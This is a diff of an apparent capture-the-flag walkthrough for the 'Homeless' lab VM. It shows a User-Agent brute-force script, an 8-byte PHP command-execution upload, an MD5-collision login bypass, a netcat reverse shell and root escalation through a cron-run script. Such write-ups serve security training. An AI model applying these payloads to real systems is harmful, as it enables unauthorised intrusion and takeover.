@@ -54,12 +54,12 @@ Hey Remember rockyou..
 
 Apparently, "Use Brain with Google" is not a real path. There's also a hint about the famed "rockyou" password list.
 
-This is how the site looked like when rendered by a browser.
+This is how the site looks like in my browser.
 
 ![screenshot-1](/assets/images/posts/homeless-walkthrough/screenshot-1.png){: style="display: block"}
 ![screenshot-2](/assets/images/posts/homeless-walkthrough/screenshot-2.png){: style="display: block"}
 
-Noticed anything unusual? The browser's `User-Agent` string was there. In the HTML source code, something else stood out as well.
+Notice anything unusual? The browser's `User-Agent` string is there. In the HTML source code, something else stands out as well.
 
 ![screenshot-3](/assets/images/posts/homeless-walkthrough/screenshot-3.png)
 
@@ -67,7 +67,7 @@ A hint to check something. But what to check? Perhaps to check the `User-Agent` 
 
 ![screenshot-4](/assets/images/posts/homeless-walkthrough/screenshot-4.png)
 
-The nifty `curl` has an option to submit user-supplied `User-Agent` string as part of the HTTP request to a site. To that end, I wrote `check.sh` to submit a custom `User-Agent` string and then check for the HTTP response at line 32.
+The nifty `curl` has an option to submit user-supplied `User-Agent` string as part of the HTTP request to a site. To that end, I wrote `check.sh`, a `bash` script, to submit a custom `User-Agent` string and then check for the HTTP response at line 32.
 
 {% highlight bash linenos %}
 # cat check.sh
@@ -83,7 +83,7 @@ RESP=$(curl -s -A "$UA" $HOST \
 echo $RESP
 {% endhighlight %}
 
-Indeed. Line 32 of the HTTP response always showed the supplied `User-Agent` string.
+Indeed, Line 32 of the HTTP response always shows the supplied `User-Agent` string.
 
 ### Finding the Way Home
 
@@ -93,7 +93,7 @@ There's one problem. Rockyou password list has about 14 million entries. It'll t
 
 For that, I'm using [parallel][4], a command-line driven utility for Linux and other Unix-like operating systems which allows the user to execute shell scripts in parallel.
 
-I expanded `check.sh` to include logic to stop when line 32 of the HTTP response is different from the supplied `User-Agent` string.
+I expand `check.sh` to include logic to stop when line 32 of the HTTP response is different from the supplied `User-Agent` string.
 
 {% highlight bash linenos %}
 # cat check.sh
@@ -130,27 +130,27 @@ On top of that, I wrote `brute.sh`, a wrapper script to feed a wordlist to `chec
 parallel ./check.sh < $1 >> $2
 {% endhighlight %}
 
-I reduced the size of the "rockyou" list by preserving alphanumeric characters and splitting the list into sub-lists of 1000 lines each.
+I reduce the size of the "rockyou" list by preserving alphanumeric characters and splitting the list into sub-lists of 1000 lines each.
 
 ```
 # grep -Pao '^[a-zA-Z0-9]+$' rockyou.txt > reducio.txt
 # split -a5 reducio.txt -d reducio_
 ```
 
-I also used `parallel` to run `check.sh` in parallel to max out my CPU like so.
+I also use `parallel` to run `check.sh` in parallel to max out my CPU like so.
 
 ```
 # parallel ./brute.sh {} booyah.txt ::: reducio_*
 ```
 
-After it finished in about 21 minutes, the result was in `booyah.txt`.
+The script took about 21 minutes to complete. The result is in `booyah.txt`.
 
 ```
 # cat booyah.txt
 [!] Found: "cyberdog" - Nice Cache!.. Go there.. myuploader_priv
 ```
 
-As long as the password contained "cyberbog", it's able to unlock the path to home.
+As long as the password contain "cyberbog", it's able to unlock the path to home.
 
 ```
 # ./check.sh "old school cyberdog"
@@ -163,16 +163,17 @@ On hindsight, I could also unlock the secret backdoor by looking at the `favicon
 
 ### Uploader Page
 
-Navigating to `/myuploader_priv` revealed the uploader page.
+I navigate to `/myuploader_priv` to find the uploader page.
 
 ![screenshot-5](/assets/images/posts/homeless-walkthrough/screenshot-5.png)
 
-After some tinkering with the uploader page, this is what I observed:
+After some tinkering with the uploader page, this is what I observe:
 
-* The file of any content type must be 8 bytes or less; and
-* A fresh upload will replace the previous one.
+* The file can be of any content type; and
+* The file size must be less than or equals to eight bytes; and
+* A new upload will replace the previous one.
 
-This is how I imagined the PHP code of the uploader page to look like.
+This is how I imagine the PHP code of the uploader page to look like.
 
 {% highlight php linenos %}
 <?php
@@ -195,7 +196,7 @@ This is how I imagined the PHP code of the uploader page to look like.
 
 ### PHP Tags and Execution Operators
 
-Gathering the restrictions from above, the challenge now is to write a short and valid PHP code of no more than 8 bytes. PHP supports [short open tag][5] (<tt><?=</tt>) and [execution operators][6] (<tt>\`&hellip;\`</tt>). Using these 2 short forms, I was able to squeeze in 8 bytes of valid PHP code to list the files in `/myuploader_priv/files` like so.
+Gathering the restrictions from above, the challenge now is to write a short and valid PHP code of no more than eight bytes. PHP supports [short open tag][5] (<tt><?=</tt>) and [execution operators][6] (<tt>\`&hellip;\`</tt>). Using these two short forms, I'm able to squeeze in eight bytes of valid PHP code to list the files in `/myuploader_priv/files` like so.
 
 ```shell
 echo -n '<?=`ls`;' > test.php
@@ -209,11 +210,11 @@ echo -n '<?=`ls`;' > test.php
 
 ### Secure Login Page
 
-Navigating to `/d5fa314e8577e3a7b8534a014b4dcb221de823ad` revealed the Secure Login page.
+Navigating to `/d5fa314e8577e3a7b8534a014b4dcb221de823ad`, reveals the Secure Login page.
 
 ![screenshot-9](/assets/images/posts/homeless-walkthrough/screenshot-9.png)
 
-There was a hint at the top right corner of the "Sign In" form revealing the PHP code of this page.
+There's a hint at the top right corner of the "Sign In" form revealing the PHP code of this page.
 
 {% highlight php linenos %}
 <?php
@@ -251,14 +252,14 @@ I'm no cryptography expert but it's obvious that this challenge requires MD5 col
 
 I found an informative [page][7] detailing how one can generate 2<sup>N</sup> collisions using `fastcoll`, a fast MD5 collision generator written by Marc Stevens.
 
-Suffice to say, I've downloaded the [source](https://github.com/brimstone/fastcoll) code of `fastcoll` and compiled it with `libboost-all-dev`.
+Suffice to say, I've downloaded the [source](https://github.com/brimstone/fastcoll) code of `fastcoll` and compile it with `libboost-all-dev`.
 
 ```
 # apt-get install libboost-all-dev
 # g++ -O3 *.cpp -lboost_filesystem -lboost_program_options -lboost_system -o fastcoll
 ```
 
-Following the steps from the page, I wrote `gen.sh`, a helper script to generate 4 colliding blobs encoded with [Percent-encoding][8].
+Following the steps from the page, I wrote `gen.sh`, a helper script to generate four colliding blobs encoded in [Percent-encoding][8].
 
 {% highlight bash linenos %}
 # cat gen.sh
@@ -292,7 +293,7 @@ done
 
 ### On a Collision Course
 
-Using `curl` to submit 3 colliding blobs as `username`, `password` and `code` respectively, I was able to get a session and access `admin.php` like so.
+Using `curl` to submit three colliding blobs as `username`, `password` and `code` respectively, I'm able to get a session and access `admin.php` like so.
 
 ```
 # curl -i -d "username=$(cat collisions/00)" -d "password=$(cat collisions/01)" -d "code=$(cat collisions/10)" -d "login=Login" http://192.168.198.130/d5fa314e8577e3a7b8534a014b4dcb221de823ad/
@@ -312,27 +313,27 @@ Content-Type: text/html; charset=UTF-8
 Well done!
 ```
 
-I replaced the existing session cookie with the one above to display `admin.php`.
+I replace the existing session cookie with the one above to display `admin.php`.
 
 ![screenshot-10](/assets/images/posts/homeless-walkthrough/screenshot-10.png)
 
 ### Low Privilege Shell
 
-The terminal allowed remote command execution and `nc` with `-e` is available.
+The terminal allows remote command execution and `nc` with `-e` is available.
 
 ![screenshot-11](/assets/images/posts/homeless-walkthrough/screenshot-11.png)
 
-I can use `nc` to run a low-privilege reverse shell back to me.
+I can use `nc` to run a low-privilege reverse shell back.
 
 ![screenshot-12](/assets/images/posts/homeless-walkthrough/screenshot-12.png)
 
-During enumeration of the system, I came across the user `downfall` and the contents of his/her home directory.
+I come across the user `downfall` and the contents of his/her home directory during enumeration of the system.
 
 ![screenshot-13](/assets/images/posts/homeless-walkthrough/screenshot-13.png)
 
 ### Hail Hydra!
 
-The creator of this VM was kind enough to suggest that the password starts with "sec". Based on this information, I narrowed down a password list from "rockyou".
+The creator of this VM is kind enough to suggest that the password starts with "sec".
 
 ```
 # grep -Pao '^sec.*$' /usr/share/wordlists/rockyou.txt > seclist.txt
@@ -351,11 +352,11 @@ Armed with the SSH password, I'm able to login as `downfall` and view the conten
 
 ### Privilege Escalation
 
-I noticed that `downfall` is able to edit `/lib/logs/homeless.py`. On top of that, there's a `cron` job ran by `root` every minute, executing:
+I notice that `downfall` is able to edit `/lib/logs/homeless.py`. On top of that, there's a `cron` job running in the context of `root` every minute, executing:
 
 `cd /lib/logs/ && ./homeless.py`
 
-This is how `homeless.py` looked like.
+This is how `homeless.py` looks like.
 
 ![screenshot-15](/assets/images/posts/homeless-walkthrough/screenshot-15.png)
 
@@ -363,7 +364,7 @@ Combining all the above information, I can probably edit `homeless.py` as follow
 
 ![screenshot-16](/assets/images/posts/homeless-walkthrough/screenshot-16.png)
 
-A minute later, a `root` shell appeared on my `netcat` listener.
+A minute later, a `root` shell appears on my `netcat` listener.
 
 ![screenshot-17](/assets/images/posts/homeless-walkthrough/screenshot-17.png)
 
@@ -371,7 +372,7 @@ A minute later, a `root` shell appeared on my `netcat` listener.
 
 ### All Your Base Are Belong to Us
 
-With a `root` shell, obtaining the flag is trivial.
+With a `root` shell, getting the flag is trivial.
 
 ![screenshot-18](/assets/images/posts/homeless-walkthrough/screenshot-18.png)
 
